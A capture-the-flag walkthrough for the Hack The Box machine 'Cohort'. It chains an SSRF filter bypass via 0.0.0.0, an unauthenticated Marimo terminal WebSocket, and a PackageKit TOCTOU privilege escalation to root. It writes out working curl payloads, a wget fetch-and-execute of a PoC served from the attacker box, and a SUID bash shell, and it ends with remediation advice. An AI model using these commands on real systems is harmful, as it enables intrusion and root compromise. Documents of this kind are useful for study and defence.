# HTB Cohort — Walkthrough (User → Root)

**Box:** Cohort (Season 11, Linux)
**Chain:** SSRF (0.0.0.0 filter bypass) → internal /status leak → Marimo terminal WebSocket → `marimo` shell → PackageKit TOCTOU (CVE-2026-41651) → SUID bash → root
**Status:** user.txt + root.txt retrieved

---

## 1. Recon

- Ports: **22**, **80**, **443**; wildcard cert `*.cohort.htb`
- Host entry: `echo "10.10.x.x cohort.htb" | sudo tee -a /etc/hosts`
- SPA returns 200/908 bytes for everything → filter by length:

```bash
gobuster dir -u https://cohort.htb/ -k \
  -w /usr/share/wordlists/dirb/common.txt --exclude-length 908
```

| Path | Code | Note |
|---|---|---|
| /api | 301 | → /api/ |
| /assets | 301 | → /assets/ |
| /status | 403 | direct blocked → try via SSRF |

```bash
gobuster dir -u https://cohort.htb/api -k \
  -w /usr/share/wordlists/dirb/common.txt --exclude-length 47
```

- `/api/health` → `{"ok": true, "service": "cohort-insights"}`
- `/api/validate` accepts a `url` field → SSRF candidate

---

## 2. SSRF

```bash
curl -ks 'https://cohort.htb/api/validate' -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1/"}'   # "Internal or loopback addresses are not permitted."
```

**Bypass:** `0.0.0.0` is not blocklisted

```bash
curl -ks 'https://cohort.htb/api/validate' -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0/"}'     # 200 + homepage preview

curl -ks 'https://cohort.htb/api/validate' -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0/status"}'
```

`/status` leaks routing map:

| Item | Value |
|---|---|
| Edge | cohort-edge / nginx, root /var/www/cohort |
| Insights API | 127.0.0.1:5000 (under /api/) |
| Notebook | 127.0.0.1:8888 |
| Notebook vhost | nb-1be3782a8afd3ad5.cohort.htb |

`/status` via SSRF = 200 despite direct 403 → access control sits on the proxy, not the app.

---

## 3. Foothold — Marimo terminal WebSocket (CVE-2026-39987)

```bash
curl -ks 'https://cohort.htb/api/validate' -H 'Content-Type: application/json' \
  -d '{"url":"http://0.0.0.0:8888/"}'   # marimo login page, /auth/login

websocat -k 'wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws'
```

- Login page is token-gated; `/terminal/ws` is not
- `whoami` → `marimo` → `cat user.txt` (done)

---

## 4. Privesc — CVE-2026-41651 ("Pack2TheRoot")

- PackageKit 1.2.8-2ubuntu1.2, deliberately held → inside 1.0.2–1.3.4
- Bug: TOCTOU on `cached_transaction_flags` in `src/pk-transaction.c`
- Call 1 `InstallFiles(SIMULATE)` → polkit skipped, state READY, install queued
- Call 2 `InstallFiles(NONE, payload)` → overwrites flags/paths, backward state transition silently dropped
- Idle callback dispatches with caller's flags → payload installed as root
- No auth prompt, no race to win: both calls land before the idle fires

### Confirm (on target)

```bash
pkcon --version                  # expect 1.2.8
dpkg -l packagekit | tail -1     # expect ...1.2.8-2ubuntu1.2
busctl --system list | grep -i packagekit
```

Not listed = D-Bus activated; starts on first call. No problem.

### Build PoC (attack box)

```bash
sudo apt install -y libglib2.0-dev make git
git clone https://github.com/Vozec/CVE-2026-41651
cd CVE-2026-41651 && make
python3 -m http.server 9002
```

### Deliver + run (marimo shell)

```bash
cd /tmp
wget http://<YOUR_IP>:9002/cve-2026-41651 -O pk
chmod +x pk && ./pk
```

**Expected output:**

```
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy)
[*] Step 2 : InstallFiles(NONE=0x0, payload)
[!] PK error 48: Failed to obtain authentication.   <-- normal, ignore
[+] SUCCESS — SUID bash at t+200ms
uid=1001(marimo) ... euid=0(root)
```

### Root

```bash
id
cat /root/root.txt
```

---

## 5. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| PK error 48 | Expected — install already dispatched. Wait, then `ls -l /tmp/.suid_bash` |
| packagekitd crashes (g_assert abort) | Side-effect DoS; exploit already won; daemon re-activates |
| Nothing happens | Re-run once — needs both D-Bus calls to beat the idle callback |
| C build fails / glib mismatch | Plan B (below) |
| Shell dies | Re-enter: `/tmp/.suid_bash -p` |

**Plan B (Python):**

```bash
python3 -c "import gi; print('ok')"
wget https://raw.githubusercontent.com/mawussid/CVE-2026-41651-Python/main/cve-2026-41651.py
python3 cve-2026-41651.py --exec 'cat /root/root.txt'
```

---

## 6. Findings & Remediation

| # | Finding | Severity |
|---|---|---|
| 1 | SSRF: loopback blocked but 0.0.0.0/127.1/decimal IPs not | High |
| 2 | /status leaks internal hostnames/ports; 403 only at proxy | Medium |
| 3 | Marimo /terminal/ws unauthenticated (CVE-2026-39987) | Critical |
| 4 | PackageKit 1.2.8 TOCTOU → unauth local root (CVE-2026-41651, CVSS 8.8) | High |

**Remediation:**
- Validate resolved IPs, not strings; deny 0.0.0.0, decimal/octal/IPv6-mapped forms
- Remove /status from prod or auth it app-side
- Bind notebook to loopback and require token on /terminal/ws; upgrade Marimo
- Patch PackageKit ≥ 1.3.5 (1.4.0 for sibling backend bypasses); if unpatchable: `systemctl stop packagekit && systemctl mask packagekit`
- Cleanup: `rm -f /tmp/.suid_bash /tmp/.pk-*.deb`

**References:**
- CVE-2026-41651 — https://nvd.nist.gov/vuln/detail/cve-2026-41651
- Fix commit — https://github.com/PackageKit/PackageKit/commit/76cfb675fb31acc3ad5595d4380bfff56d2a8697
- PoC — https://github.com/Vozec/CVE-2026-41651
